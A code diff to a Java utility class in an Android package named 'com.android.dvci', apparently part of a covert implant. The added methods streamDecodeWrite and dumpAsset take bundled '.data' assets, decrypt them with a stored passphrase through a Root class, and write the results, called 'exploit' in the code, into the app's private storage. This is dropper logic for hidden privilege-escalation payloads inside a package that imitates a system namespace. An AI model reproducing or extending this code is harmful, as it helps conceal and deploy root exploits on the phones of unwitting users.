@@ -15,8 +15,10 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.security.SecureRandom;
 
+import android.content.Context;
 import android.content.res.AssetManager;
 
+import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 
@@ -167,4 +169,39 @@ public final class Utils {
 	    out.close();
 	}
 
+	private static boolean streamDecodeWrite(final String exploit, InputStream stream, String passphrase) {
+		try {
+			InputStream in = Root.decodeEnc(stream, passphrase);
+
+			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
+			byte[] buf = new byte[1024];
+			int numRead = 0;
+
+			while ((numRead = in.read(buf)) >= 0) {
+				out.write(buf, 0, numRead);
+			}
+
+			out.close();
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (streamDecodeWrite): " + ex);
+			}
+
+			return false;
+		}
+
+		return true;
+	}
+
+	public static boolean dumpAsset(String asset, String filename) {
+		if(Cfg.DEBUG) {
+			Check.asserts(asset.endsWith(".data"), "asset should end in .data");
+		}
+		InputStream stream = getAssetStream(asset);
+		return streamDecodeWrite(filename, stream, Cfg.RNDDB);
+	}
 }
